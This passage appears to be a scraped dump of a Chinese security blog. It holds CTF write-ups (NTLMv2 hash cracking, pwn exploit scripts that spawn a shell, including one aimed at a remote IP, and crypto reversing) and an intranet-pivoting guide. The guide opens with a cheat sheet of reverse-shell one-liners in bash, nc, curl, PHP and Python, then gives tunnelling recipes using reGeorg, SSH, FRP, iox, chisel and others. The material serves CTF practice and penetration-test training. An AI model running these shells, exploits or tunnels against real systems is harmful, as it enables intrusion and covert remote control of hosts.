3]\nb=b'outguess'\nd=[]\nfor i,k in enumerate(a):\n    d.append(b[i%len(b)]^k)\nprint(bytes(d))\n```\n\n得到key: ulhged98BhgVHYp\n\n根据vba中的`outguess`提示，对文件中的图片使用outguess解密后得到flag\n\n`outguess -k 'ulhged98BhgVHYp' -r image1.jpg -t 1.txt`\n\n\n## EZtraffic\n\n导出SMB对象\n\n导出的压缩包注释中得到`NTLM v2 plaintext + \\d{5}`\n\n那么根据NTLM v2的格式拼接后爆破即可\n\n`username::domain:challenge:HMAC-MD5:blob`\n\n\n在流量包中对应的数据如下\n\n```\nUser name: rockyou\nDomain name: MicrosoftAccount\nServer Challenge: 4936df20962cae6d\nNTproofStr: db12ced50faf52f141636e80205e8f28\nNTLMv2 Response: 01010000000000003604281b951fdb017b4045aa008508eb0000000002001e00440042004500440036004200350041002d0035003100430032002d00340001001e00440042004500440036004200350041002d0035003100430032002d00340004004800640062006500640036006200350061002d0035003100630032002d0034003100650063002d0061006400380034002d0064006400320062003500370030006400350030003900360003004800640062006500640036006200350061002d0035003100630032002d0034003100650063002d0061006400380034002d00640064003200620035003700300064003500300039003600070008003604281b951fdb01060004000200000008003000300000000000000001000000002000008029a5d8256e5c2762f439df5c06f3bc411fb0faeb3a6fa52d9273c57b09f2d10a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e0031002e00380031000000000000000000\n\n//HMAC-MD5对应数据包中的NTProofStr\n//blob对应数据包中Response去掉NTProofStr的后半部分\n```\n\n`rockyou::MicrosoftAccount:4936df20962cae6d:db12ced50faf52f141636e80205e8f28:01010000000000003604281b951fdb017b4045aa008508eb0000000002001e00440042004500440036004200350041002d0035003100430032002d00340001001e00440042004500440036004200350041002d0035003100430032002d00340004004800640062006500640036006200350061002d0035003100630032002d0034003100650063002d0061006400380034002d0064006400320062003500370030006400350030003900360003004800640062006500640036006200350061002d0035003100630032002d0034003100650063002d0061006400380034002d00640064003200620035003700300064003500300039003600070008003604281b951fdb01060004000200000008003000300000000000000001000000002000008029a5d8256e5c2762f439df5c06f3bc411fb0faeb3a6fa52d9273c57b09f2d10a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e0031002e00380031000000000000000000`\n\n使用`hashcat`爆破\n\n`hashcat -m 5600 1.txt rockyou.txt --show`\n\n![](/img/wp/2024/2024-zjss-cs-EZtraffic-1.png)\n\n\n掩码爆破得到`haticehatice12580`\n\n解压后是100张小图片，使用gaps的效果不好，猜测有地方存储了拼图顺序\n\n发现每张图片的Red 0通道保存有一张二维码\n\n![](/img/wp/2024//2024-zjss-cs-EZtraffic-2.png)\n\n写脚本排序并拼图\n\n```python\nfrom PIL import Image\nimport zxing\nimport os\n\n\ndef process_image_to_qrcode(image_path):\n    # 读取图片Red 0通道数据\n    img = Image.open(image_path)\n    w, h = img.size\n    rgb = ['']\n    for j in range(h):\n        for i in range(w):\n            data = img.getpixel((i, j))\n            rgb[0] += str(data[0] % 2)\n\n    # 转成二维码\n    img = Image.new('1', (w, h))\n    for j in range(h):\n        for i in range(w):\n            img.putpixel((i, j), int(rgb[0][j * w + i]))\n    img.save('./out/' + image_path.split('\\\\')[-1])\n\n    # 扫描二维码\n    reader = zxing.BarCodeReader()\n    barcode = reader.decode('./out/' + image_path.split('\\\\')[-1])\n\n    return image_path, barcode.parsed\n\n\npath = \"./final_out\"\nnames = []\nfor root, dirs, files in os.walk(path):\n    for file in files:\n        names.append(os.path.join(root, file))\n\nresults = []\nfor name in names:\n    results.append(process_image_to_qrcode(name))\n    print(results[-1])\n\n\n# 根据二维码内容排序，将图片合并 10*10\nresults.sort(key=lambda x: int(x[1]))\nprint(results)\nwidth_i = 50\nheight_i = 50\nline_max = 10\nrow_max = 10\npic_max = line_max * row_max\ntoImage = Image.new('RGB', (width_i * line_max, height_i * row_max))\nfor i in range(pic_max):\n    pic_path = results[i][0]\n    pic_fole_head = Image.open(pic_path)\n    tmppic = pic_fole_head.resize((width_i, height_i))\n    loc = (int(i % line_max * width_i), int(i // line_max * height_i))\n    toImage.paste(tmppic, loc)\ntoImage.save('merged.png')\n```\n\n![](/img/wp/2024/2024-zjss-cs-EZtraffic-3.png)\n\n\n\n\n# pwn\n\n## shellcode\n\n\n```python\nfrom pwn import *\ncontext.arch='amd64'\nshellcode=\"\"\"pop rcx\nxchg rdi,rdx\nsub rcx,0x44\npush rcx\nret\n\"\"\"\nprint(len(asm(shellcode)))\n#exit()\n#p=process(\"./shellcode\")\np=remote(\"139.155.126.78\",\"32343\")\n\n#gdb.attach(p,'bp $rebase(0x1424)\\nc')\npause()\np.send(asm(shellcode))\n\npause()\nshellcode=\"\"\"\n    mov rcx,rax\n    add rcx,0x100\n    mov rbx,0x50f\n    mov  word ptr [rcx],bx\n    push 0x68\n    mov rax, 0x732f2f2f6e69622f\n    push rax\n    mov rdi, rsp\n    push 0x1010101 ^ 0x6873\n    xor dword ptr [rsp], 0x1010101\n    xor esi, esi /* 0 */\n    push rsi /* null terminate */\n    push 8\n    pop rsi\n    add rsi, rsp\n    push rsi /* 'sh\\x00' */\n    mov rsi, rsp\n    xor edx, edx /* 0 */\n    push 0x3b\n    pop rax\n    jmp rcx\n    \"\"\"\np.send(asm(shellcode))\n\np.interactive()\n```\n\n## apple\n\n存在数组越界可修改stdout的数据，利用io结构体获取shell\n\n```python\nfrom pwn import *\ncontext.arch='amd64'\ndef add(ind,size):\n    p.sendafter('choice',p32(1))\n    p.sendafter(b'index',p32(ind&0xffffffff))\n    p.sendafter(b'long?',p32(size&0xffffffff))\n    pass\ndef show(ind):\n    p.sendafter('choice',p32(3))\n    p.sendafter(b'index',p32(ind&0xffffffff))\n    p.readuntil('>>>\\n')\n    return p.readuntil('1.',drop=1)\n\ndef delete(ind):\n    p.sendafter('choice',p32(2))\n    p.sendafter(b'index',p32(ind&0xffffffff))\n    pass\n\ndef edit(ind,data):\n    p.sendafter('choice',p32(4))\n    p.sendafter(b'index',p32(ind&0xffffffff))\n\n    p.sendafter(b'>>>',data)\n    pass\np=process('./pwn')\nlibc=ELF(\"./libc.so.6\")\nadd(0,0x500)\nadd(1,0x500)\n\ndelete(0)\nd=u64(show(0).ljust(8,b'\\x00'))\nlibc.address=d-0x21ace0\nfake_io_add=libc.sym['_IO_2_1_stdout_']\ngadget=libc.address+0xebc88\nwfile_jump=libc.sym['_IO_wfile_jumps']\nobstack_jump=libc.address+0x2173c0\ngs=fake_io_add+0xe0\nshelladd=gs+0xe8\nmprotect=libc.sym['mprotect']\nsetcontext=libc.sym['setcontext']\n\nshellcode=shellcraft.sh()\n\n\nobstack=fake_io_add\ncontext=fake_io_add+0xe8\nshelladd=context+0xe8\nfake_io=flat({\n    0x28: shelladd,\n    0x38: setcontext,\n    0x48: [context,1],\n\t0xd8: obstack_jump+0x20,\n    0xe0: fake_io_add,\n\t},filler=b'\\x00')\n\ncont=flat({\n\t0x68: obstack&(~0xfff), # rdi\n\t0x70: 0x1000, # rsi\n\t0x88: 7, # rdx\n\t0xa0: obstack+0x28, # rsp\n\t0xa8: mprotect, # rcx->rip\n\t0xe0: obstack\n\t},filler=b'\\x00')\n\npayload=fake_io+cont+asm(shellcode)\n\nfor i in range(13):\n    add(i+2,0x300)\npause()\nedit(-8,payload)\np.interactive()\n```\n\n\n# reverse\n\n## ezRe\n\n魔改rc4\n\n```python\nclass rc4():\n    def toBytes(self,data):\n        if type(data)==str:\n            return data.encode()\n        elif type(data)==bytes:\n            return data\n        else:\n            raise Exception(\"data Type Error\")\n\n    def GetKey(self,data):\n        k=[132, 206, 173, 4, 211, 121, 250, 202, 41, 13, 59, 166, 91, 116, 34, 200, 248, 49, 102, 215, 63, 160, 21, 103, 135, 68, 208, 175, 36, 30, 146, 181, 38, 64, 194, 57, 165, 195, 79, 99, 141, 0, 145, 96, 189, 128, 5, 170, 90, 55, 148, 229, 73, 219, 104, 243, 15, 77, 123, 152, 111, 239, 2, 35, 93, 190, 9, 26, 105, 199, 167, 228, 84, 124, 143, 252, 232, 66, 130, 122, 8, 71, 28, 53, 172, 251, 203, 89, 209, 23, 147, 101, 127, 86, 137, 236, 184, 1, 185, 134, 24, 16, 50, 32, 100, 76, 230, 88, 19, 225, 168, 87, 43, 94, 207, 46, 22, 214, 136, 54, 164, 106, 133, 10, 198, 60, 98, 142, 110, 192, 220, 201, 222, 140, 82, 95, 51, 154, 62, 118, 221, 11, 125, 233, 108, 52, 17, 234, 254, 14, 18, 255, 120, 29, 155, 126, 153, 40, 176, 12, 177, 245, 171, 83, 156, 187, 191, 112, 80, 235, 244, 237, 109, 78, 249, 231, 149, 72, 216, 107, 241, 69, 174, 253, 27, 144, 182, 180, 150, 61, 162, 56, 163, 186, 37, 131, 65, 223, 39, 115, 138, 33, 218, 42, 157, 3, 97, 246, 210, 178, 158, 92, 240, 117, 47, 217, 205, 196, 70, 159, 129, 58, 81, 227, 6, 213, 74, 113, 151, 7, 67, 20, 45, 75, 139, 204, 44, 161, 226, 179, 119, 188, 247, 25, 31, 48, 242, 183, 197, 238, 193, 85, 114, 169, 224, 212]\n        return k\n\n    def Cipher(self,data):\n        data=self.toBytes(data)\n        enc=[]\n        k=self.Key.copy()\n        n=0\n        n1=0\n        tmp=0\n        key=[]\n        print(k)\n        for _ in range(50):\n            n=(n+1)&0xff\n            n1=(n1+k[n])&0xff\n            tmp=k[n]\n            k[n]=k[n1]\n            k[n1]=tmp\n            key.append(k[(k[n]+k[n1])%256])\n        print(key)\n        for c,k in zip(data,key):\n            enc.append(c^k^51)\n        return bytes(enc)\n\n\n    def __init__(self,key):\n        key=self.toBytes(key)\n        self.Key=self.GetKey(key)\n        self.__Key=key\n\n    def SetKey(self,key):\n        key=self.toBytes(key)\n        self.Key=self.GetKey(key)\n        self.__Key=key\n\nimport base64\nb=base64.b64decode(\"w53Cj3HDgzTCsSM5wrg6FMKcw58Qw7RZSFLCljRxwrxbwrVdw4AEwqMjw7/DkMKTw4/Cv8Onw4NGw7jDmSdcwq4GGg==\").decode(\"utf-8\")\nb_=[]\nfor i in b:\n    b_.append(ord(i))\nkey=b\"7e021a7dd49e4bd0837e22129682551b\"\nkey_=[]\nfor i in key:\n    key_.append(i^102)\nr=rc4(bytes(key_))\nprint(r.Cipher(bytes(b_)))\n```\n\n\n\n# 信创安全\n\n## sm4rev\n\n将文件在linux中运行一遍\n\n发现在`/tmp`目录下生成了一个随机文件`xxx`开头的文件夹，里面存放了一个二进制程序\n\n\n使用`find-crypto`插件发现是`sm4`加密，且是`ECB`模式\n\n\n\n注意端序\n\n```python\nv17 = list(range(6))\nv17[0] = 0x01DE4BF77DAD5D82;\nv17[1] = 0x4F456C06436A9EDC;\nv17[2] = 0x6584914E6D690D85;\nv17[3] = 0x2DABC532B0D82242;\nv17[4] = 0x3E205B8369A8D383;\nv17[5] = 0xBF353724125EBC3A;\n\n\nfor i in v17:\n    print(i.to_bytes(8, byteorder='little').hex(),end='')\n```\n\n密文: `825dad7df74bde01dc9e6a43066c454f850d696d4e9184654222d8b032c5ab2d83d3a869835b203e3abc5e12243735bf`\n\n密钥: `0123456789abcdeffedcba9876543210`\n\n\n`DASCTF{SM4_is_secure_but_d0nt_t3ll_any0ne!}`\n\n\n\n# 数据安全\n\n## ds-enen\n\n附加data.vhd没有内容\n\nforemost分离出一个zip\n\n数字暴力破解得到密码`60111106`\n\n打开是一个csv表格，个性签名被加密了，看组成猜测是aes，用密码做为key\n\n\n```python\nfrom Crypto.Cipher import AES\nimport pandas as pd\nimport base64\n\ndata = pd.read_csv('data.csv')\npassword = data['密码']\nsignature = data['个性签名(加密版)']\n\n\ndef aes_decrypt(ciphertext, key):\n    key = key.encode('utf-8') + (16 - len(key)) * b'\\0'\n    ciphertext = base64.b64decode(ciphertext)\n    cipher = AES.new(key, AES.MODE_ECB)\n    plaintext = cipher.decrypt(ciphertext)\n    return plaintext\n\n\nfor i in range(len(password)):\n    if 'DASCTF' in aes_decrypt(signature[i], password[i]).decode('utf-8'):\n        print(aes_decrypt(signature[i], password[i]).decode('utf-8'))\n        break\n    else:\n        continue\n```\n\n`DASCTF{dcd85182008e3a2d51b37f9845df3312}`\n\n\n\n## ds-encode\n\n\n与 [2024年“羊城杯”粤港澳大湾区网络安全大赛](http://localhost:4000/posts/da856207/#%E5%88%9D%E8%B5%9B-%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8) 初赛的数据安全基本一样\n\n区别是数据源给的不一样，这次是mysql数据库的文件\n\n将题目给的文件全部复制到mysql中的data文件中即可，注意数据库版本需要是5.7(ib_logfile中可以看到)\n\n![](/img/wp/2024/2024-zjss-cs-ds-encode-1.png)\n\n剩下的就很简单了","tags":["wp","2024竞赛","浙江"],"categories":["wp"]},{"title":"内网渗透学习(代理篇)","url":"/posts/52375b43/","content":"\n本文中使用的代理工具可通过我的脚本一键下载[https://github.com/dr0n1/CTF_misc_auto_deploy](https://github.com/dr0n1/CTF_misc_auto_deploy)\n\n# 反弹shell\n\n推荐在本地部署一个[reverse-shell-generator](https://github.com/0dayCTF/reverse-shell-generator)，可以很方便的查看命令\n\n以下是几个常用的\n\n## bash -i\n\n```shell\n/bin/sh -i >& /dev/tcp/1.1.1.1/8888 0>&1\n```\n\n## nc\n\n```shell\n# nc -e\nnc 1.1.1.1 8888 -e /bin/sh\n\n# nc -c\nnc -c /bin/sh 1.1.1.1 8888\n\n# nc mkfifo\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 1.1.1.1 8888 >/tmp/f\n```\n\n\n## curl\n\n```shell\nC='curl -Ns telnet://1.1.1.1:8888'; $C </dev/null 2>&1 | /bin/sh 2>&1 | $C >/dev/null\n```\n\n## php\n\n```shell\nphp -r '$sock=fsockopen(\"1.1.1.1\",8888);exec(\"/bin/sh <&3 >&3 2>&3\");'\n\nphp -r '$sock=fsockopen(\"1.1.1.1\",8888);system(\"/bin/sh <&3 >&3 2>&3\");'\n```\n\n\n## python\n\n```shell\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"1.1.1.1\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'\n\npython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"1.1.1.1\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'\n\npython3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"1.1.1.1\",8888));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/sh\")'\n```\n\n# HTTP 隧道\n\n常用的也就是一个Neo-reGorg，其他的[Tunna](https://github.com/SECFORCE/Tunna) [pystinger](https://github.com/FunnyWolf/pystinger) 等用的就比较少了\n\n## reGeorg\n\n[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)\n\n1. 上传 tunnel 文件\n2. 连接 WEB 服务器，并在本地建立 socks5 代理\n\n```bash\npython reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp\n```\n\n## Neo-reGorg\n\n[https://github.com/L-codes/Neo-reGeorg](https://github.com/L-codes/Neo-reGeorg)\n\n1. 设置密码生成 tunnel.(aspx|ashx|jsp|jspx|php) 并上传到WEB服务器\n\n```bash\npython neoreg.py generate -k password\n```\n\n2. 使用 neoreg.py 连接 WEB 服务器，在本地建立 socks5 代理\n\n```bash\npython3 neoreg.py -k password -p 6666 -u http://xx/tunnel.php\n```\n\n\n# SSH隧道\n\n常见参数\n\n```text\n-C：压缩传输，提高传输速度\n-f：表示 SSH 连接成功后，转入后台运行\n-N：建立静默连接，表示只连接远程主机，不打开远程 shell\n-g：允许远程主机连接本地用于转发的端口\n-L：本地端口转发 (L 参数一共接受三个值，分别是 本地端口:目标主机:目标主机端口)\n-R：远程端口转发 (R 参数也是接受三个值，分别是 远程主机端口:目标主机:目标主机端口)\n-D：动态转发（SOCKS 代理）\n-P：指定 SSH 端口\n```\n\n![SSH隧道拓扑](/img/summary/daili-1.png)\n\n## 本地转发\n\n本地转发的意思是将远程主机的某个端口的数据转发到本地服务器的指定端口\n\n这里假设192.168网段是公网，攻击机可以直连\n\n在**攻击机**上执行\n\n```bash\nssh -CfNg -L 6677:172.16.10.10:8080 root@192.168.100.167\n#ssh端口非默认可以用 -p 指定\n```\n\n就能将边界服务器上host2的流量转发到本地的6677端口上\n\n访问本地的6677端口就能访问到内网的host2\n\n![](/img/summary/daili-2.png)\n\n\n## 远程转发\n\n假设上图中的host1完全处于内网或者做了策略，使得攻击机访问不了host1了，但是host1可以访问vps(攻击机)，就需要远程转发\n\n在**host1**上执行\n\n```bash\nssh -CfNg -R 6666:172.16.10.11:8090 vps\n```\n\n然后访问vps的6666端口就可以访问到host3了\n\n\n由于对于 host1 来说，vps 是远程主机，所以这种情况就被称为远程端口绑定\n\n---\n\n这里有一点需要注意，如果使用的是默认配置，可能导致转发后的进程是127.0.0.1\n\n```bash\ntcp        0      0 127.0.0.1:6666          0.0.0.0:*               LISTEN      25278/sshd: root\n```\n\n如果需要是0.0.0.0，则需要修改vps上ssh的配置文件\n\n```bash\n#/etc/ssh/sshd_config\n\nGatewayPorts yes\n```\n\n`systemctl restart sshd`\n\n\n## 动态转发\n\n动态端口映射就是建立一个 SSH 加密的 SOCKS 4/5 代理通道\n\n在vps上或者host1本身上执行都行\n\n```bash\nssh -CfNg -D 0.0.0.0:4455 root@192.168.100.167\n```\n\n然后将执行命令的主机的ip和4455端口做socks5代理\n\n---\n\n另一种稍微麻烦一点的方式：\n\n先在**host1**上执行\n\n```bash\nssh -qTfnN -D 0.0.0.0:7000 root@localhost\n```\n\n然后转发出去即可\n\n```bash\nssh -qTfnN -R 0.0.0.0:6699:0.0.0.0:7000 vps\n```\n\n将vps的6699端口配为socks5代理ip后就可以访问内网的host2和host3了\n\n![](/img/summary/daili-3.png)\n\n\n\n\n# 传输层隧道\n\n上面的http隧道，ssh隧道，包括不常用的dns隧道，都属于应用层，下面是一些常用的 端口转发 & 内网代理工具\n\n这些综合工具支持多种协议，这里使用其中的socks协议进行内网的代理\n\n后续工具的命令以此图为参照\n\n![虚拟机模拟拓扑图](/img/summary/daili-5.png)\n\n\n## Stowaway\n\n[https://github.com/ph4ntonn/Stowaway](https://github.com/ph4ntonn/Stowaway)\n\n```text\nadmin参数:\n-l 被动模式下的监听地址[ip]:<port>\n-s 节点通信加密密钥,所有节点(admin&&agent)必须一致\n-c 主动模式下的目标节点地址\n--socks5-proxy socks5代理服务器地址\n--socks5-proxyu socks5代理服务器用户名(可选)\n--socks5-proxyp socks5代理服务器密码(可选)\n--http-proxy http代理服务器地址\n--down 下游协议类型,默认为裸TCP流量,可选HTTP/WS\n--tls-enable 为节点通信启用TLS，在启用TLS后，AES加密将被禁用\n--domain 指定TLS SNI/WebSocket域名，若为空，默认为目标节点地址\n--heartbeat 开启心跳包\n\n\nagent参数:\n-l 被动模式下的监听地址[ip]:<port>\n-s 节点通信加密密钥\n-c 主动模式下的目标节点地址\n--socks5-proxy socks5代理服务器地址\n--socks5-proxyu socks5代理服务器用户名(可选)\n--socks5-proxyp socks5代理服务器密码(可选)\n--http-proxy http代理服务器地址\n--reconnect 重连时间间隔\n--rehost 端口复用时复用的IP地址\n--report 端口复用时复用的端口号\n--up 上游协议类型,默认为裸TCP流量,可选HTTP/WS\n--down 下游协议类型,默认为裸TCP流量,可选HTTP/WS\n--cs 运行平台的shell编码类型，默认为utf-8，可选gbk\n--tls-enable 为节点通信启用TLS，在启用TLS后，AES加密将被禁用\n--domain 指定TLS SNI/WebSocket域名，若为空，默认为目标节点地址\n```\n\n---\n\n**单层代理**\n\n边界服务器(host1)运行：\n\n```bash\n./linux_x64_admin -l 7000 -s 123\n```\n\n客户端(host2)运行：\n\n```bash\n./linux_x64_agent -c host1_ip:7000 -s 123 --reconnect 8\n```\n\n连接成功后在服务器端的交互窗口建立代理\n\n```bash\nuse 0\nsocks 6666\n```\n\n![](/img/summary/daili-6.png)\n\n使用host1:6666作为socks代理后就可以进行后续其他操作了\n\n![](/img/summary/daili-7.png)\n\n---\n\n**多层代理**\n\n边界服务器(host1)运行：\n\n```bash\n./linux_x64_admin -l 7000 -s 123\n```\n\n外层主机(host2)运行：\n\n```bash\n./linux_x64_agent -c host1_ip:7000 -s 123 --reconnect 8\n```\n\n建立连接后在控制端运行：\n\n```bash\nuse 0\nlisten\n1\n2233\n```\n\n相当于在host2上监听2233端口\n\n![](/img/summary/daili-8.png)\n\n\n然后用内层主机(host4)连接外层主机(host2)的2233端口\n\n```bash\n./linux_x64_agent -c host2:2233 -s 123 --reconnect 8\n```\n\n控制端等待节点加入后建立socks代理，注意需要选择新节点\n\n```bash\nback\nuse 1\nsocks 6666\n```\n\n![](/img/summary/daili-9.png)\n\n![](/img/summary/daili-10.png)\n\n\n## FRP\n\n[https://github.com/fatedier/frp](https://github.com/fatedier/frp)\n\n将 frpc 复制到内网服务所在的机器上。\n将 frps 复制到拥有公网 IP 地址的机器上，并将它们放在任意目录。\n\n编写配置文件，目前支持的文件格式包括 TOML/YAML/JSON，旧的 INI 格式仍然支持，但已经不再推荐。\n使用以下命令启动服务器：`./frps -c ./frps.toml`\n使用以下命令启动客户端：`./frpc -c ./frpc.toml`\n\n---\n\n**单层代理**\n\n服务端(host1)监听端口然后启动\n\n```bash\n# frps.toml\nbindPort = 7000\n```\n\n客户端(host2)配置\n\n```bash\n# frpc.toml\nserverAddr = \"host1_ip\"\nserverPort = 7000\n\n[[proxies]]\nname = \"socks5\"\ntype = \"tcp\"\nplugin.type = \"socks5\"\nremotePort = 6666\n```\n\n用proxifier或proxychains指定host1_ip和6666端口即可\n\n还可以选择使用web控制面板或者添加token\n\n---\n\n**多层代理**\n\n服务端(host1)配置\n\n```bash\n# frps.toml\nbindPort = 7000\n```\n\n外层主机(host2)同时当(host1的)客户端和(host4的)服务端\n\n```bash\n# frpc.toml\n#端口转发\n#将本地6666端口转发到服务端的6666端口\n\nserverAddr = \"host1_ip\"\nserverPort = 7000\n\n[[proxies]]\nname = \"portforward\"\ntype = \"tcp\"\nlocalIP = \"127.0.0.1\"\nlocalPort = 6666\nremotePort = 6666\n```\n\n\n```bash\n# frps.toml\nbindPort = 7001\n```\n\n\n内层主机(host4)配置文件\n\n```bash\n# frpc.toml\nserverAddr = \"host2_ip\"\nserverPort = 7001\n\n[[proxies]]\nname = \"socks5\"\ntype = \"tcp\"\nplugin.type = \"socks5\"\nremotePort = 6666\n```\n\n![](/img/summary/daili-16.png)\n\n\n## iox\n\niox 是一个端口转发 & 内网代理工具，功能类似于lcx/ew\n\n[https://github.com/EddieIvan01/iox](https://github.com/EddieIvan01/iox)\n\n\n**端口转发**\n\n```bash\n# 监听 0.0.0.0:8888 和0.0.0.0:9999，将两个连接间的流量转发\n./iox fwd -l 8888 -l 9999\n\n# 监听0.0.0.0:8888，把流量转发到1.1.1.1:9999\n./iox fwd -l 8888 -r 1.1.1.1:9999\n\n# 连接1.1.1.1:8888和1.1.1.1:9999, 在两个连接间转发\n./iox fwd -r 1.1.1.1:8888 -r 1.1.1.1:9999\n```\n\n\n\n**单层正向代理**\n\n直接在边界服务器(host1)上启动Socks5服务就好了\n\n```bash\n./iox proxy -l 6666\n```\n\n**二层正向代理**\n\n外层主机(host2)启动socks服务\n\n```bash\n./iox proxy -l 5555\n```\n\n边界服务器(host1)监听端口并转发流量\n\n```\n./iox fwd -l 6666 -r host2:5555\n```\n\n**多层正向代理**\n\n\n内层主机(host4)启动socks服务\n\n```bash\n./iox proxy -l 4444\n```\n\n外层主机(host2)监听端口并转发流量\n\n```\n./iox fwd -l 5555 -r host4:4444\n```\n\n边界服务器(host1)监听端口并转发流量\n\n```\n./iox fwd -l 6666 -r host2:5555\n```\n\n![](/img/summary/daili-15.png)\n\n---\n---\n\n**一层反向代理**\n\n\nlinux攻击机上监听端口并转发\n\n```bash\n./iox proxy -l 7000 -l 6666\n```\n\n\n边界主机(host1)将流量转发到攻击机\n\n```bash\n./iox proxy -r server:7000\n```\n\n\n**二层反向代理**\n\n\nlinux攻击机上监听端口并转发\n\n```bash\n./iox proxy -l 7000 -l 6666\n```\n\n\n边界主机(host1)监听并将流量转发到攻击机\n\n```bash\n./iox fwd -l 7001 -r server:7000\n```\n\n\n\n外层主机(host2)开启socks代理并转发到host1\n\n```bash\n./iox proxy -r host1:7001\n```\n\n\n\n\n**多层反向代理**\n\n\nlinux攻击机上监听端口并转发\n\n```bash\n./iox proxy -l 7000 -l 6666\n```\n\n\n边界主机(host1)监听并将流量转发到攻击机\n\n```bash\n./iox fwd -l 7001 -r server:7000\n```\n\n\n\n外层主机(host2)监听并将流量转发到host1\n\n```bash\n./iox fwd -l 7002 -r host1:7001\n```\n\n内层主机(host4)开启socks代理并转发到host2\n\n```bash\n./iox proxy -r host2:7002\n```\n\n![](/img/summary/daili-14.png)\n\n\n\n## chisel\n\n[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\n\n\n**单层代理**\n\n在服务端(host1)运行，表示开启7000端口来监听进行反向代理\n\n```bash\n./chisel server -p 7000 --reverse\n```\n\n客户端(host2)运行，表示连接到服务端(host1)的7000端口，把host1:6666作为socks5代理\n\n```bash\n./chisel client host1:7000 R:0.0.0.0:6666:socks\n```\n\n![](/img/summary/daili-4.png)\n\n**多层代理**\n\n\n还是先在服务端(host1)运行，表示开启7000端口来监听\n\n```bash\n./chisel server -p 7000 --reverse\n```\n\n外层主机(host2)即当客户端也当服务端\nclient的命令表示连接到服务端(host1)的7000端口，并将host4转来的5555的流量再次转到服务端(host1)上的6666端口\nserver的命令表示开启7001端口监听\n\n```bash\n./chisel client host1:7000 R:0.0.0.0:6666:127.0.0.1:5555\n./chisel server -p 7001 --reverse\n```\n\n内层主机(host4)运行，连到host2:7001，并将流量转发到host2的5555端口\n\n```bash\n./chisel client host2:7001 R:0.0.0.0:5555:socks\n```\n\n\n\n搭建完毕后可以看到host1控制台有一条这样的信息：`server: session#1: tun: proxy#R:6666=>5555: Listening`\n\nhost2的控制台有一条：`server: session#1: tun: proxy#R:5555=>socks: Listening`\n\n使用host1:6666端口作为socks代理即可\n\n\n## NPS\n\n>nps貌似已经不更新了，存在不少bug，非比赛环境需要谨慎使用，社区中有许多二开版本，可以自行查看\n\n>官方版本存在越权漏洞。漏洞原理是利用伪造两个参数auth_key、timestamp来完成越权操作的，修复方式是注释掉auth_crypt_key，并修改auth_key的值为随机值，auth_key记得去掉注释\n>https://github.com/weishen250/npscrack\n\n\n服务端安装后使用 nps start 启动\n\n然后访问8080端口 账户密码默认为 admin/123\n\n选择新建一个客户端\n\n![](/img/summary/daili-11.png)\n\n然后把客户端文件传递到外层主机上后执行提供的命令\n\n![](/img/summary/daili-12.png)\n\n然后新增socks代理即可\n\n![](/img/summary/daili-13.png)\n\n\n\n# linux下全局代理\n\n在windows下可以用proxifier轻松实现进程级的全局代理\n\n但是在linux下会有很多命令或者软件的流量不走proxychains的情况出现\n\n\n这里可以用clash解决\n\n首先在service mode点击安装，旁边的地球变绿就ok了\n\n![](/img/summary/daili-17.png)\n\n然后在profiles的地方编辑配置文件\n\n![](/img/summary/daili-18.png)\n\n选中自己配置的选项后就能实现全局代理了，注意用tun mode\n\n![](/img/summary/daili-19.png)\n\n\n包括ping命令等都可以走代理了\n\n![](/img/summary/daili-20.png)\n\n---\n\n参考文章：\n\n[Frp内网多层隧道搭建](http://myblog.ac.cn/archives/2023-01-01-15-38-00)\n[内网隧道穿透](https://www.geekby.site/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/#1-%E5%9C%BA%E6%99%AF%E4%BB%8B%E7%BB%8D)\n[内网代理搭建](https://fushuling.com/index.php/2023/09/21/%e5%86%85%e7%bd%91%e4%bb%a3%e7%90%86%e6%90%ad%e5%bb%ba/)\n[内网渗透测试 <3> 隧道技术](https://3nd.xyz/post/2020-05-25-AD-Pentest-Hidden-Tunnel/#%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF)\n[【Tips+1】IOX 多层网络正向穿透](https://mp.weixin.qq.com/s/yUs0Tc3VDCoskc0dSJY1GQ)\n[【Tips+1】IOX 反向穿透四层网段](https://mp.weixin.qq.com/s/9mcF_Snk-loPO-ApI5ECag)\n\n","tags":["总结","内网渗透"],"categories":["总结"]},{"title":"2024年“羊城杯”粤港澳大湾区网络安全大赛 wp","url":"/posts/da856207/","content":"\n\n# [初赛] 数据安全\n\n## data-analy1\n\n恢复被打乱的数据\n\n```python\nimport csv\nimport re\nimport pandas as pd\n\ndata = pd.read_csv(\"person_data.csv\", encoding='utf-8')\ny = data.to_dict(orient='records')\n\n\nd = {'编号': '', '用户名': '', '密码': '', '姓名': '', '性别': '', '出生日期': '', '身份证号': '', '手机号码': ''}\n\n\nheader = data.columns.values.tolist()\nwith open(\"person_data_new.csv\", \"w\", encoding='utf-8', newline='') as f:\n    f_csv = csv.writer(f)\n    f_csv.writerow(header)\n\ndef hanzi(data):\n    pattern = re.compile(r'[\\u4e00-\\u9fa5]{2,}')\n    matches = pattern.findall(data)\n\n    if len(matches) > 0:\n        return True\n\n\n\nfor i in y:\n    for _, value in i.items():\n        if len(value) == 18 and value[0:17].isdigit():\n            d['身份证号'] = value\n        elif len(value) == 1 and not value.isdigit():\n            d['性别'] = value\n        elif len(value) == 8 and value.isdigit():\n            d['出生日期'] = value\n        elif re.search(r'[a-fA-F0-9]{32}', value)!=None:\n            d['密码'] = value\n        elif 